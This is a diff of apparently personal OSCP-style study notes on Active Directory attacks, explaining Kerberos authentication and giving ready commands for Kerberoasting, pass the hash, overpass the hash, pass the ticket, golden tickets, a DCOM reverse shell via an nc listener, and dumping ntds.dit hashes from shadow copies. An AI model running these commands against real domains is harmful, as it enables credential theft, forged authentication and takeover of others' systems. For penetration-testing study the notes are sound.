@@ -52,13 +52,13 @@ Step 3 (TGS-REQ): \{user + timestamp\} (encrypted with session key), resource na
 
 DC checks: Timestamp must be valid, username encrypted with session key must match TGT, source IP has to match TGT, then TGS-REP is sent
 
-Step 4 (TGS-REP): name of service granted (encrypted with session key from step 2), new session key (encrypted with session key from step 2), service ticket with username, groups, and new session key (service ticket is encrypted with password hash of service account).
+Step 4 (TGS-REP): name of service granted (encrypted with session key from step 2), new session key (encrypted with session key from step 2), service ticket (known as TGS) with username, groups, and new session key (service ticket/TGS is encrypted with password hash of service account).
 
 User will then continue auth with the actual service.
 
-Step 5 (AP-REQ): username & timestamp (encrypted with new session key from step 4), and service ticket
+Step 5 (AP-REQ): username & timestamp (encrypted with new session key from step 4), and TGS
 
-Application server decrypts the service ticket to get username, and checks if it matches username from the other part of AP-REQ. Then it will check the groups listed in the service ticket and assign the user the appropriate perms and then send AP-REP.
+Application server decrypts the TGS to get username, and checks if it matches username from the other part of AP-REQ. Then it will check the groups listed in the TGS and assign the user the appropriate perms and then send AP-REP.
 
 [Privileged Account Certificate](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962) (PAC) [validation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84) is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller.
 
@@ -152,7 +152,7 @@ When preauthentication is not enabled, we can just send username over without an
 
 ### Kerberoasting (cracking service/SPN pw)
 <details>
-The service ticket from Step 4 of [Kerberos Auth](/docs/general/AD#kerberos-auth-steps) is encrypted using the SPN's password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as [Kerberoasting](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/).
+The TGS from Step 4 of [Kerberos Auth](/docs/general/AD#kerberos-auth-steps) is encrypted using the SPN's password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as [Kerberoasting](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/).
 
 Powershell: `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast` 
 
@@ -161,11 +161,11 @@ Linux: `sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain
 If you have GenericAll or GenericWrite on a user, u can set an [SPN for the user](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)), kerberoast the account, and crack the password hash
 </details>
 
-### Silver Ticket (forge service ticket to access services)
+### Silver Ticket (forge TGS to access services)
 <details>
 Requires: Privileged Account Certificate (PAC) validation is disabled (quite common), and possession of service account password/hash (can obtain via [kerberoasting](/docs/general/AD#kerberoasting-targetting-servicespn))
 
-With hash of service account, u can forge a service ticket from step 4 of [kerberos auth](/docs/general/AD#kerberos-auth-steps). 
+With hash of service account, u can forge a TGS from step 4 of [kerberos auth](/docs/general/AD#kerberos-auth-steps). 
 
 We need three things:
 - SPN password hash: run mimikatz and then `privilege::debug` and `sekurlsa::logonpasswords` and look for the service account entry and take the NTML hash
@@ -187,6 +187,19 @@ Requires: Replicating Directory Changes, Replicating Directory Changes All, and
 
 the NTLM hash can be found in the section showed here:
 ![Screenshot of impacket-secretsdump output](./img/DomainBackupAbuse.png)
+</details>
+
+### Pass the Hash (login if u have NTLM)
+<details>
+Requires (all conditions rather common):
+- only NTLM auth is used
+- NTLM hash of a user on the machine
+- SMB connection through the firewall (commonly port 445)
+- ADMIN$ share must be available, and File and Printer Sharing has to be turned on (default settings)
+
+However, u usually also require local admin rights on target machine.
+
+run this on kali:  `/usr/bin/impacket-wmiexec -hashes :<compromised hash> <compromised user>@<victim ip>` (eg `/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73` )
 </details>
 
 ## Lateral Movement
@@ -245,17 +258,48 @@ Requires:
 copy PsExec64 from kali (in desktop/cybertools/sysinternals) `.\PsExec64.exe -i  \\<client name like FILES04> -u corp\<user> -p <pw> <cmd or other process u wanna start>` (eg `.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`)
 </details>
 
-### Pass the Hash
+### Overpass the Hash
 <details>
-Requires (all conditions rather common):
-- only NTLM auth is used
-- NTLM hash of a user on the machine
-- SMB connection through the firewall (commonly port 445)
-- ADMIN$ share must be available, and File and Printer Sharing has to be turned on (default settings)
+Requires:
+- an NTLM hash
 
-However, u usually also require local admin rights on target machine.
+in mimikatz: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell` (eg `sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`). then, start a service as that user (like `net use \\files04`) and then u can do `C:\tools\SysinternalsSuite\PsExec.exe \\files04 cmd` to gain code execution as that user thru TGT instead of NTLM
 
-run this on kali:  `/usr/bin/impacket-wmiexec -hashes :<compromised hash> <compromised user>@<victim ip>` (eg `/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73` )
+Basicly mimikatz helps to do the whole Kerberos auth process using NTLM.
+</details>
+
+### Pass the Ticket
+<details>
+Requires: There should be a user on a service that you have identified that you want to compromise. Or maybe u just export all the tickets and check if each of them work and what u can access idk
+
+run `privilege::debug` then `sekurlsa::tickets /export` in mimikatz, then look at the generated kirbi files to find an appropriate user + service that u wanna target. once found, `kerberos::ptt <filename>.kirbi`. it should return a ‘File: smth smth: OK’ and when u run `klist` in powershell it should show a ticket from the target user (under client) on the target service (under server). then u can just use the service like `ls \\web04\<shared folder>` or smth
+
+Mimikatz extracts the stored TGSes and can import them to our current user to give us perms
+</details>
+
+### DCOM
+<details>
+Requires: current user to have an account on target machine
+
+In powershell: `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target ip>"))` then replace the IP address in `encode.py` then `python3 encode.py` and copy the output. The, run `nc -nvlp 443` to generate the encoded string and use the following command: 
+`$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<python output>","7")`
+</details>
+
+### Golden Ticket
+<details>
+Requires: Either krbtgt NTLM hash or admin perms on DC machine
+
+If you have admin perms on DC machine, run mimikatz on the DC, then `privilege::debug` and `lsadump::lsa patch` then search for krbtgt and get the ntlm hash.
+
+then get the domain sid (basically the whole thing until just before the last dash) using `whoami /user` then do `kerberos::purge` and `kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<ntlm hash> /ptt` (eg `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`) then do `misc::cmd` to launch cmd, then `PsExec.exe \\dc1 cmd.exe` . However, PsExec with the ip address instead of \\dc1 would force ntlm auth and fail.
+</details>
+
+### Shadow Copies 
+pure persistence, i think no need for OSCP cuz it requires u to have domain admin on DC
+<details>
+Requires: Domain admin on DC
+
+on dc as domain admin: `vshadow.exe -nw -p  C:`, take note of 'shadow copy device name'. then `copy <shadow copy device name>\windows\ntds\ntds.dit c:\ntds.dit.bak` and `reg.exe save hklm\system c:\system.bak`. transfer files to kali, then on kali, `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`. it should print out all the hashes then u save somewhere
 </details>
 
 </details>
